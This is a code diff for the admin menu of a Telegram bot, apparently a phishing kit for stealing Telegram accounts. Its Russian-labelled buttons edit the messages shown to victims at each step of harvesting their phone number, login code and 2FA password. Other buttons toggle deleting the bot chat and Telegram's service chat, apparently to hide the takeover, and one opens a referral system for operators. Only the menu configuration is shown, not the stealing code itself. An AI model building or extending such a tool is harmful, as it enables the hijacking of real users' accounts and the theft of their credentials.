@@ -16,104 +16,96 @@ export default {
                 inline_keyboard: [
                     [
                         {
-                            text: `После нажатия /start`,
+                            text: `👋🏻 Вступительное сообщение /start`,
                             callback_data: `editt:${id}:start`
                         }
                     ],
                     [
                         {
-                            text: `После ввода номера`,
+                            text: `👤 Кнопка поделится контактом`,
+                            callback_data: `editt:${id}:contact` 
+                        }
+                    ],
+                    [
+                        {
+                            text: `⌛️ Ожидание кода`,
+                            callback_data: `editt:${id}:wait`
+                        },
+                        {
+                            text: `📲 Ввод кода`,
                             callback_data: `editt:${id}:code`
                         }
                     ],
+                    // [
+                    //     {
+                    //         text: `📝 Вводит код не на клавиатуре`,
+                    //         callback_data: `editt:${id}:NaNCode`
+                    //     }
+                    // ],
                     [
                         {
-                            text: `После авторизации`,
+                            text: `♻️ Проверка кода`,
                             callback_data: `editt:${id}:auth`
-                        }
-                    ],
-                    [
+                        },
                         {
-                            text: `Требование 2fa`,
-                            callback_data: `editt:${id}:password`
-                        }
-                    ],
-                    [
-                        {
-                            text: `После неверного 2fa`,
-                            callback_data: `editt:${id}:wrongPassword`
-                        }
-                    ],
-                    [
-                        {
-                            text: `После неверного кода`,
+                            text: `❌ Неверный код`,
                             callback_data: `editt:${id}:wrongCode`
                         }
                     ],
                     [
                         {
-                            text: `Если код буквами`,
-                            callback_data: `editt:${id}:NaNCode`
-                        }
-                    ],
-                    [
-                        {
-                            text: `Просроченная авторизация`,
+                            text: `⏰ Код просрочен`,
                             callback_data: `editt:${id}:timeout`
-                        }
-                    ],
-                    [
+                        },
                         {
-                            text: `Ошибка авторизации`,
+                            text: `🚫 Ошибка отправки кода`,
                             callback_data: `editt:${id}:error`
                         }
                     ],
                     [
                         {
-                            text: `Ожидание кода`,
-                            callback_data: `editt:${id}:wait`
+                            text: `🔐 Ввод пароля (2FA)`,
+                            callback_data: `editt:${id}:password`
                         }
                     ],
                     [
                         {
-                            text: `Расслыка для авторизованых`,
-                            callback_data: `editt:${id}:mailing1h`
+                            text: `🔒 Неверный пароль (2FA)`,
+                            callback_data: `editt:${id}:wrongPassword`
                         }
                     ],
                     [
                         {
-                            text: `Текст кнопки для авторизованых`,
-                            callback_data: `editt:${id}:button`
+                            text: `🎉 Сообщение после авторизации ${t.mailing1hUnauth ? '🟢' : '🔴'}`,
+                            callback_data: `editt:${id}:mailingUnauth`
+                        }
+                    ],
+                    // [
+                    //     {
+                    //         text: `📞 Определение номера (🟢/🔴)`,
+                    //         callback_data: `editt:${id}:phoneCheck`
+                    //     }
+                    // ],
+                    [
+                        // {
+                        //     text: `📣 Авто.Рассылка (🟢/🔴)`,
+                        //     callback_data: `editt:${id}:autoMailing`
+                        // },
+                        {
+                            text: `👥 Реф.система`,
+                            callback_data: `referral:${id}`
                         }
                     ],
                     [
                         {
-                            text: `Ссылка для авторизованых`,
-                            callback_data: `editt:${id}:url`
+                            text: `🤖 Удалить чат с ботом ${t.deleteBot ? '🟢' : '🔴'}`,
+                            callback_data: `editt:${id}:deleteBot`
                         }
                     ],
                     [
                         {
-                            text: `Расслыка для не авторизованых`,
-                            callback_data: `editt:${id}:mailing1hUnauth`
-                        }
-                    ],
-                    [
-                        {
-                            text: `Текст кнопки для не авторизованых`,
-                            callback_data: `editt:${id}:buttonUnauth`
-                        }
-                    ],
-                    [
-                        {
-                            text: `Ссылка для не авторизованых`,
-                            callback_data: `editt:${id}:urlUnauth`
-                        }
-                    ],
-                    [
-                        {
-                            text: `Текст кнопки`,
-                            callback_data: `editt:${id}:contact`
+                            text: `🔇 Удалить чат с telegram ${t.deleteTelegram ? '🟢' : '🔴'}`,
+                            callback_data: `editt:${id}:deleteTelegram`
                         }
                     ],
                     [
